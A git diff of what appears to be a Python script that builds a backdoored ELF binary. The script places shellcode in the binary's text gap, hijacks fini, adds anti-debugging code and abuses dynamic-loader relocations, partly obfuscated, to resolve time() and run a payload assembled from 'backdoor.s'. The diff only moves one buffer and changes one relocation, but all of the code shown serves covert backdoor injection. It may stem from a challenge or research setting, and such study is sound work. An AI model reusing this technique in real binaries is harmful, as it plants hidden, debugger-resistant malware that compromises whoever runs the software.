@@ -287,6 +287,7 @@ assert list(stage2.load_segments)[1].section_in_segment(stage2.get_section_by_na
 text_gap = BufferAllocator(stage2.write, ".text gap", *stage2.gap_after_load_segment(1))
 
 # Put shellcode into text gap
+time_ptr_buf = text_gap.alloc(8, "Pointer to time()")
 _dl_argv_ptr = text_gap.alloc(8, "&_dl_argv")
 dest_addr_buf = text_gap.alloc(8, "dest for *dest = value")
 value_buf = text_gap.alloc(8, "value for *dest = value")
@@ -295,7 +296,6 @@ prepare_sc = assemble_shellcode("check_inject_fini.s", PAYLOAD_SIZE_IN_WORDS=1, 
 assert len(prepare_sc) <= 104, "Prepare shellcode must be shorter than 104 bytes"
 prepare_sc_buf = text_gap.alloc(len(prepare_sc), "Shellcode for anti-gdb and hijacking fini")
 
-time_ptr_buf = text_gap.alloc(8, "Pointer to time()")
 payload_buf = text_gap.alloc(0)
 payload = assemble_shellcode(
     "backdoor.s",
@@ -316,7 +316,7 @@ prepare_sc = assemble_shellcode(
 )
 print(f"Inject Fini Shellcode Size: {len(prepare_sc)}")
 print(f"Payload Size: {len(payload)}")
-assert time_ptr_buf.address + time_ptr_buf.size == payload_buf.address
+assert prepare_sc_buf.address + prepare_sc_buf.size == payload_buf.address
 
 backup_jmprel_buf = hdr_gap.alloc(len(original_jmprel), "backup jmprel").write(original_jmprel)
 fake_fini_value_buf = hdr_gap.alloc(8, "fake fini value").write(p64(payload_buf.address + GARBAGE_CODE_SIZE))
@@ -371,8 +371,8 @@ BACKDOOR_RELOC += [
     # Resolve time
     WriteIMM64Obf(symbol_name_buffer, u64(b"time\x00\x00\x00\x00")),
     Relocation(time_ptr_buf.address, RTYPE.R64, symidx=stage2.symidx[SYMBOL_2]),
-    # Call prepare_sc; write the return value (0) to the end of shellcode to clear the last "retn" instruction.
-    Relocation(prepare_sc_buf.address + prepare_sc_buf.size - 8, RTYPE.R64, symidx=stage2.symidx[SYMBOL_1]),
+    # Call prepare_sc; write the return value (0) to clear time_ptr_buf.
+    Relocation(time_ptr_buf.address, RTYPE.R64, symidx=stage2.symidx[SYMBOL_1]),
     # Restore original JMPREL. We have carefully set up the DT_RELA/DT_JMPREL/DT_RELASZ so that ld.so would do
     # a second pass on JMPREL.
     Relocation(stage2.symtab(SYMBOL_0) + 8, RTYPE.RELATIVE, addend=backup_jmprel_buf.address),
